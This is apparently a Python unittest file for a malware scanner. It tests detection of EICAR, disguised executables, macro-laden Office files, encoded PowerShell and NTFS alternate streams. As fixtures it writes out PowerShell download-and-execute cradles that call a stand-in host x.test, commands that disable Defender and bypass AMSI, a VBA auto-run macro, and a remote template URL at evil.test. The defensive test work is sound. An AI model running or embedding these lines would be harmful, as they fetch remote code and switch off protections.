"""Tests for Scanner, AdvancedScanner, Evasion, DownloadCradle, Signature, AlternateStream."""
import os
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

from sentinel import config
from sentinel.entropy import shannon_entropy
from sentinel.scanner import CLEAN, ERROR, MALICIOUS, SUSPICIOUS, Scanner, SignatureDB
from tests.helpers import EICAR


class ScannerTests(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(prefix="sentinel_t_"))
        self.sc = Scanner()

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    def write(self, name, data):
        p = self.dir / name
        p.write_bytes(data if isinstance(data, bytes) else data.encode())
        return p

    def skip_if_av_blocked(self, r):
        # Windows Defender (or another AV) refuses to open EICAR files: errno 22 / file gone.
        if r.verdict == ERROR:
            self.skipTest("EICAR file blocked by the system antivirus: " + "; ".join(r.reasons))

    def test_eicar_is_malicious(self):
        r = self.sc.scan_file(self.write("eicar.com.txt", EICAR))
        self.skip_if_av_blocked(r)
        self.assertEqual(r.verdict, MALICIOUS)

    def test_hash_signature(self):
        p = self.write("bad.bin", "totally-fake-malware-sample")
        sha = self.sc.scan_file(p).sha256
        db = SignatureDB(dirs=[])
        db.hashes[sha] = "Unit-Test-Malware"
        r = Scanner(db).scan_file(p)
        self.assertEqual(r.verdict, MALICIOUS)

    def test_clean_text(self):
        self.assertEqual(self.sc.scan_file(self.write("notes.txt", "hello world")).verdict, CLEAN)

    def test_double_extension(self):
        r = self.sc.scan_file(self.write("invoice.pdf.exe", b"MZ" + b"\x00" * 100))
        self.assertIn(r.verdict, (SUSPICIOUS, MALICIOUS))

    def test_executable_disguised_as_pdf(self):
        r = self.sc.scan_file(self.write("report.pdf", b"MZ" + b"\x00" * 100))
        self.assertEqual(r.verdict, SUSPICIOUS)

    def test_powershell_downloader(self):
        s = "powershell -enc " + "QUJD" * 12 + "\nIEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
        r = self.sc.scan_file(self.write("run.ps1", s))
        self.assertIn(r.verdict, (SUSPICIOUS, MALICIOUS))

    def test_entropy(self):
        self.assertGreater(shannon_entropy(os.urandom(100000)), 7.5)
        self.assertLess(shannon_entropy(b"abababab" * 1000), 2)

    def test_scan_tree(self):
        self.write("a.txt", "ok")
        self.write("eicar.txt", EICAR)
        results = list(self.sc.scan_tree(self.dir))
        for r in results:
            self.skip_if_av_blocked(r)
        self.assertEqual(len(results), 2)
        self.assertEqual(sum(r.verdict == MALICIOUS for r in results), 1)


class AdvancedScannerTests(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(prefix="sentinel_adv_"))
        self.sc = Scanner()

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    def zip_of(self, name, members):
        import zipfile
        p = self.dir / name
        with zipfile.ZipFile(p, "w") as z:
            for n, data in members.items():
                z.writestr(n, data)
        return p

    def test_zip_with_executable(self):
        r = self.sc.scan_file(self.zip_of("a.zip", {"setup.exe": b"MZ\x00", "readme.txt": b"hi"}))
        self.assertTrue(any("programs/scripts" in x for x in r.reasons))

    def test_zip_with_disguised_program(self):
        r = self.sc.scan_file(self.zip_of("b.zip", {"invoice.pdf.exe": b"MZ"}))
        self.assertTrue(any("disguised" in x for x in r.reasons))

    def test_clean_zip(self):
        r = self.sc.scan_file(self.zip_of("c.zip", {"notes.txt": b"hello", "img.png": b"\x89PNG"}))
        self.assertEqual(r.verdict, CLEAN)

    def test_docx_hiding_macros_is_malicious(self):
        vba = b"Sub AutoOpen()\nShell \"powershell\"\nEnd Sub"
        r = self.sc.scan_file(self.zip_of("evil.docx", {"word/document.xml": b"<x/>", "word/vbaProject.bin": vba}))
        self.assertEqual(r.verdict, MALICIOUS)

    def test_plain_docx_is_clean(self):
        r = self.sc.scan_file(self.zip_of("ok.docx", {"word/document.xml": b"<x/>"}))
        self.assertEqual(r.verdict, CLEAN)

    def test_remote_template_injection(self):
        rels = b'<Relationship Type=".../attachedTemplate" Target="http://evil.test/t.dotm" TargetMode="External"/>'
        r = self.sc.scan_file(self.zip_of("t.docx", {"word/_rels/settings.xml.rels": rels}))
        self.assertTrue(any("remote template" in x for x in r.reasons))

    def test_legacy_ole_macro(self):
        data = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64 + b"VBA AutoOpen Shell" + b"\x00" * 64
        p = self.dir / "old.doc"
        p.write_bytes(data)
        self.assertEqual(self.sc.scan_file(p).verdict, SUSPICIOUS)

    def test_new_script_patterns(self):
        s = "Set-MpPreference -DisableRealtimeMonitoring $true\n[Ref].Assembly.GetType('AmsiUtils')"
        p = self.dir / "x.ps1"
        p.write_text(s)
        self.assertEqual(self.sc.scan_file(p).verdict, MALICIOUS)

    def test_ransom_note_name(self):
        p = self.dir / "HOW_TO_DECRYPT_FILES.txt"
        p.write_text("pay us")
        self.assertEqual(self.sc.scan_file(p).verdict, SUSPICIOUS)

    def test_allowlist(self):
        p = self.dir / "invoice.pdf.exe"
        p.write_bytes(b"MZ" + b"\x00" * 50)
        sha = self.sc.scan_file(p).sha256
        from sentinel.scanner import add_to_allowlist
        add_to_allowlist(sha, "unit test")
        r = Scanner().scan_file(p)
        self.assertEqual(r.verdict, CLEAN)
        # but a known-bad hash is never allowlisted away
        db = SignatureDB(dirs=[])
        db.hashes[sha] = "Bad"
        self.assertEqual(Scanner(db).scan_file(p).verdict, MALICIOUS)


class EvasionTests(unittest.TestCase):
    """Regression tests for the evasion gaps found in the security review."""
    PS = "Set-MpPreference -DisableRealtimeMonitoring $true\nIEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"

    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(prefix="sentinel_ev_"))
        self.sc = Scanner()

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    def scan_bytes(self, name, data):
        p = self.dir / name
        p.write_bytes(data)
        return self.sc.scan_file(p)

    def test_utf16_script_with_bom(self):
        r = self.scan_bytes("a.ps1", b"\xff\xfe" + self.PS.encode("utf-16-le"))
        self.assertEqual(r.verdict, MALICIOUS)

    def test_utf16_script_without_bom(self):
        r = self.scan_bytes("b.ps1", self.PS.encode("utf-16-le"))
        self.assertEqual(r.verdict, MALICIOUS)

    def test_short_encoded_flag_and_hidden_payload(self):
        import base64
        payload = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://x.test')".encode("utf-16-le"))
        r = self.scan_bytes("c.bat", b"powershell -w hidden -e " + payload)
        self.assertIn("PowerShell encoded command", r.reasons)
        self.assertTrue(any("hidden in encoded command" in x for x in r.reasons), r.reasons)
        self.assertEqual(r.verdict, MALICIOUS)

    def test_execution_policy_is_not_an_encoded_command(self):
        r = self.scan_bytes("d.ps1", b"powershell -ExecutionPolicy Bypass -File build.ps1")
        self.assertNotIn("PowerShell encoded command", r.reasons)

    def test_padded_executable_over_size_limit(self):
        p = self.dir / "setup.exe"
        with open(p, "wb") as f:
            f.write(b"MZ" + b"\x00" * 100)
            f.truncate(config.MAX_HEURISTIC_SIZE + (1 << 20))
        r = self.sc.scan_file(p)
        self.assertTrue(any("padded" in x for x in r.reasons), r.reasons)
        self.assertNotEqual(r.verdict, CLEAN)


class DownloadCradleTests(unittest.TestCase):
    """Regression (found by `main.py benchmark`): a bare download-and-run one-liner used to score 30 = clean."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.d, True)
        self.sc = Scanner(log=False)

    def verdict(self, name, data):
        f = self.d / name
        f.write_bytes(data)
        return self.sc.scan_file(f).verdict

    def test_cradles_are_flagged_in_any_form(self):
        for i, src in enumerate([
                "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')",
                'iex(New-Object System.Net.WebClient).DownloadString("http://x.test/a")',
                "irm https://x.test/i.ps1 | iex",
                "(New-Object Net.WebClient).DownloadString('http://x.test') | Invoke-Expression",
                "Invoke-Expression (Invoke-WebRequest http://x.test/a).Content"]):
            self.assertNotEqual(self.verdict(f"c{i}.ps1", src.encode()), CLEAN, src)
            self.assertNotEqual(self.verdict(f"u{i}.ps1", src.encode("utf-16")), CLEAN, "UTF-16: " + src)

    def test_downloading_or_iex_alone_is_not_flagged(self):
        self.assertEqual(self.verdict("dl.ps1", b"(New-Object Net.WebClient).DownloadFile('https://example.com/a.msi', 'a.msi')"), CLEAN)
        self.assertEqual(self.verdict("iex.ps1", b"$c = 'Get-Date'\nInvoke-Expression $c\n"), CLEAN)


class SignatureTests(unittest.TestCase):
    """Authenticode lowers heuristic suspicion only where it is safe to."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.d, True)
        self.sc = Scanner(log=False)

    def test_valid_signature_offsets_program_heuristics(self):
        from sentinel.authenticode import has_valid_signature
        if not has_valid_signature(sys.executable):
            self.skipTest("this Python build is not Authenticode-signed")
        disguised = self.d / "photo.png"
        shutil.copy(sys.executable, disguised)
        r = self.sc.scan_file(disguised)
        self.assertEqual(r.verdict, CLEAN, r.reasons)
        self.assertTrue(any("digital signature" in x for x in r.reasons))

    def test_signature_never_excuses_a_double_extension(self):
        f = self.d / "invoice.pdf.exe"
        shutil.copy(sys.executable, f)
        self.assertNotEqual(self.sc.scan_file(f).verdict, CLEAN)

    def test_tampered_signature_gives_no_reduction(self):
        f = self.d / "photo.png"
        b = bytearray(Path(sys.executable).read_bytes())
        b[len(b) // 2] ^= 0xFF
        f.write_bytes(bytes(b))
        r = self.sc.scan_file(f)
        self.assertNotEqual(r.verdict, CLEAN)
        self.assertFalse(any("digital signature" in x for x in r.reasons))

    def test_office_recent_shortcuts_are_not_double_extensions(self):
        recent = self.d / "AppData" / "Roaming" / "Microsoft" / "Word" / "Case123"
        recent.mkdir(parents=True)
        lnk = recent / "Case_Study.docx.lnk"
        lnk.write_bytes(b"L\x00\x00\x00" + b"\x00" * 60)
        self.assertEqual(self.sc.scan_file(lnk).verdict, CLEAN)
        elsewhere = self.d / "Downloads"
        elsewhere.mkdir()
        trap = elsewhere / "Case_Study.docx.lnk"
        trap.write_bytes(b"L\x00\x00\x00" + b"\x00" * 60)
        self.assertNotEqual(self.sc.scan_file(trap).verdict, CLEAN)


@unittest.skipUnless(sys.platform == "win32", "NTFS alternate data streams are Windows-only")
class AlternateStreamTests(unittest.TestCase):
    def setUp(self):
        self.d = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.d, True)
        self.sc = Scanner(log=False)

    def write(self, name, data, stream=None):
        f = self.d / name
        if not f.exists():
            f.write_text("ordinary notes\n")
        if stream:
            with open(f"{f}:{stream}", "wb") as h:
                h.write(data)
        return f

    def test_program_hidden_in_a_stream_is_found(self):
        f = self.write("notes.txt", b"MZ" + b"\0" * 300, "payload.exe")
        from sentinel import ads
        self.assertIn(("payload.exe", 302), ads.list_streams(f))
        r = self.sc.scan_file(f)
        self.assertNotEqual(r.verdict, CLEAN)
        self.assertTrue(any("payload.exe" in x and "hidden program" in x for x in r.reasons), r.reasons)

    def test_script_hidden_in_a_stream_is_found(self):
        f = self.write("readme.txt", b"IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')\n"
                                     b"powershell -w hidden -enc " + b"QUJD" * 10, "run.ps1")
        self.assertNotEqual(self.sc.scan_file(f).verdict, CLEAN)

    def test_normal_streams_are_ignored(self):
        f = self.write("setup_notes.txt", b"[ZoneTransfer]\r\nZoneId=3\r\nHostUrl=https://example.com/\r\n",
                       "Zone.Identifier")
        self.write("setup_notes.txt", b"just a harmless comment", "comment")
        r = self.sc.scan_file(f)
        self.assertEqual(r.verdict, CLEAN, r.reasons)
        from sentinel import ads
        self.assertEqual([n for n, _ in ads.suspicious_streams(f)], ["comment"])   # listed, but harmless
